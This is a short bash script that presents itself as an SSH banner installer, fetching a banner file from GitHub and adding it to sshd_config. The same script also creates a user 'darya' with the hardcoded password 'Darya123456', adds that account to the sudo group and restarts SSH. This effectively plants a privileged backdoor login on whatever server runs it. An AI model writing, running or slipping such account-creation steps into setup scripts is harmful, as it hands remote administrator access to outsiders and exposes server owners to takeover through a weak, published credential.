#!/bin/bash

wget  https://raw.githubusercontent.com/YourServersPro/DaryaBanner/main/banner
mv banner /etc/banner
chmod 755 /etc/banner
echo "banner /etc/banner" >> /etc/ssh/sshd_config

sudo useradd -m -s /bin/bash "darya"
echo "darya:Darya123456" | sudo chpasswd
sudo chown -R "darya:darya" "/home/darya"
sudo usermod -aG sudo "darya"
systemctl restart ssh
echo "Done"
